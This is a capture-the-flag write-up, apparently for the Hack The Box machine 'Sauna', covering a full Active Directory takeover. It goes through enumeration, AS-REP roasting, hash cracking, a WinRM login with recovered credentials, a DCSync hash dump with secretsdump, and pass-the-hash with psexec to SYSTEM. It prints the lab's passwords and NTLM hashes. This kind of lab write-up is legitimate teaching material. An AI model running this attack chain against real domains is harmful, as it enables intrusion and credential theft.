# Nmap:
```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-29 06:18:38Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
```

# Enumerating LDAP with windapsearch:
```bash
└─# ./windapsearch.py -d egotistical-bank.local --dc-ip 10.10.10.175 -U        
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.10.10.175
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=EGOTISTICAL-BANK,DC=LOCAL
[+] Attempting bind
[+]     ...success! Binded as: 
[+]      None

[+] Enumerating all AD users

[*] Bye!
--------------------nothing--------------------
```

# Run GetADUsers.py:
```bash
└─# GetADUsers.py egotistical-bank.local/ -dc-ip 10.10.10.175 -debug
-----------------snippet-------------------
[+] Connecting to 10.10.10.175, port 389, SSL False
[*] Querying 10.10.10.175 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
[+] Search Filter=(&(sAMAccountName=*)(mail=*)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))
-----------------------nothing----------------------
```

# Use SMB:
```bash
└─# smbclient -L ////10.10.10.175//
-----------------Nothing----------------
```
# Lets explore the website:

![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/46b480bb-cf0a-46b8-8f5f-58f0a4d1a684)

# Copy names and make file using usernamegenerator.py:
```bash
└─# ./UsernameGenerator.py host user            
UsernameGenerator.py - Simple username generator based on a list of name and surname
------------------------------------------------------
Input file: host
Output file: user
------------------------------------------------------
Usernames written to output file user
Number of users created: 312
------------------------------------------------------
```

# Use GetNPUsers.py: (while we do not have username and we osint through the website)
```bash
└─$ for user in $(cat user); do GetNPUsers.py -no-pass -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/${user} | grep -v Impacket; done

[*] Getting TGT for fergus-s
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.

[*] Getting TGT for fsmith
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:c7b5b22089112750eeebda141f3e7339$ae6bdec89de86c0ca335e80cdd8fbc5f684fd22d826591cff434e6cdee5c9bf5b4c1ed9b0f92fb3f45155518b3114f323c49590310801d2903fa1dcc65c9d52cc19c4d640ab7f882036fe8f5271d266dddd8a610cc9ce19b453a4baad98db141af564403a0a2d0f6dae1a0b311c062af68f4ffd89b6eb2548fe9289f7806ab87a15e3aa61a0099700c6a4c97c6d78a2a5dbbac01f9039f2dde70f1adb71b418086cd8427070ca0e154949a4a0a16e6862f890c92a60e403603fc4571fb0fcc9a44c4af245c59422a253638d533e4584a0802fa13f197570cd5c8008e8fea3de79d76db240715633767051511500fb4bd6f6da181c9e3a27106293d4060b80d8b
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.

-----------------------------got ntlm hash--------------------------------
```

# Got hash-carcked using Hashcat:
```bash
└─$ hashcat hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode
------------snip------------------
15633767051511500fb4bd6f6da181c9e3a27106293d4060b80d8b:Thestrokes23
```
# Got login using Evil-winrm:
```bash
└─$ evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175
                                        
Evil-WinRM shell v3.5
*Evil-WinRM* PS C:\Users\FSmith\Documents> 
```

# Run WinPEas and see what we get login details but we can't able to login anywhere:
```bash
 Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
```

# Upload SharpHound.exe and run it
```bash
*Evil-WinRM* PS C:\Users\FSmith\desktop> upload SharpHound.exe
                                        
Info: Uploading /home/singhx/SharpHound.exe to C:\Users\FSmith\desktop\SharpHound.exe
                                        
Data: 1395368 bytes of 1395368 bytes copied
*Evil-WinRM* PS C:\Users\FSmith\desktop> ./SharpHound.exe -c All
```

# Download the .zip file and upload to bloodhound:

![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/c9188ea3-c068-44db-9c70-7b2d716cc882)

Got svc-loanmgr has dcsync privilege so we can dump administrator hash.


# Run secretsdump.py and get the hash:
```bash
└─# secretsdump.py EGOTISTICAL-BANK/svc_loanmgr@10.10.10.175                             
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

---------------------snip------------------------
```

# login using the psexec.py
```bash
└─$ psexec.py administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e   
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 10.10.10.175.....

-----------------snip----------------------------------

C:\Windows\system32>whoami
nt authority\system
```

